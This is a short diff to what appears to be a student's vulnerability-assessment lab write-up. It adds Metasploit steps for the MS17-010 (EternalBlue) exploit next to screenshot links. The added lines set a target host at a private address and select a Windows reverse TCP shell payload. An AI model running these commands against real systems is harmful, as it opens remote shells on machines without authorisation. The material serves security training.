@@ -24,7 +24,12 @@ msf > search ms17-010
 
 ![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/6d37c87ca72157e4eaee989cccb565592de36c34/image/Screenshot%202026-06-07%20030834.png)
 
+et the target host and payload.
+
 ![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/4d31cdc811d1f18e96833f07c1c1284750ae9cc3/image/Screenshot%202026-06-07%20030846.png)
+
+set RHOST 10.48.143.7
+set payload windows/x64/shell/reverse_tcp
 
 ![image alt](https://github.com/zieksyahmi/VA-Lab-Work/blob/4a65d60707e328c133d37e80996ded15086649ea/image/Screenshot%202026-06-07%20030904.png)
 
